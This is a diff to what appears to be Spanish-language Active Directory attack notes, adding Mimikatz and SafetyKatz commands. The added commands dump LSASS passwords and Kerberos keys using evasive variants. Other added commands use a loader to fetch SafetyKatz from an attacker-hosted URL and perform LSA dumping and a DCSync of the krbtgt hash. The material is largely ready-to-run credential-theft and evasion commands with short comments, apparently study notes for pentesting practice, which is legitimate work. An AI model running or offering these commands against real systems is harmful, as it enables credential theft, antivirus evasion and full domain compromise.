@@ -26,10 +26,15 @@ Además de, obtener acceso a credenciales para escalar privilegios o moverse lat
 
 # Extraer desde LSASS las claves de cifrado Kerberos (AES, RC4, etc.) de las sesiones de usuarios en el sistema.
 ❯ .\mimikatz.exe -Command '"sekurlsa::ekeys"'  
+❯ .\mimikatz.exe -Command '"sekurlsa::logonpasswords"'  
 
 # Ejecutar una versión modificada de Mimikatz (SafetyKatz) para extraer desde LSASS las claves Kerberos (AES, RC4, etc.) de los usuarios en memoria 
-❯ .\SafetyKatz.exe "sekurlsa::ekeys" exit   
-❯ .\SafetyKatz.exe "sekurlsa::evasive-keys" exit      
+❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-keys" exit      
+❯ .\SafetyKatz.exe -Command "sekurlsa::evasive-logonPasswords" exit
+
+❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-logonpasswords" "exit" 
+
+❯ Loader.exe -path SafetyKatz.exe -args "privilege::evasive-debug" "sekurlsa::evasive-keys" "exit" 
 
 Notes: 
 	1. Desde Kali se puede usar la herramienta de impacket 
@@ -108,7 +113,7 @@ Notes:
 ! Usuario de dominio (AD) con permisos de Administrador 
 
 # Ejecutar SafetyKatz dentro del DC a través de un loader para realizar un DCSync evasivo, solicitando al Domain Controller los hashes del usuario krbtgt
-❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"   # Primer comando a ejecutar 
+❯ C:\Temp\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"   # Primer comando a ejecutar 
 	# path = Indicar la ruta donde se encuentra Safetikatz de la máquina de atacante
 
 ❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"  # Segundo comando a ejecutar 
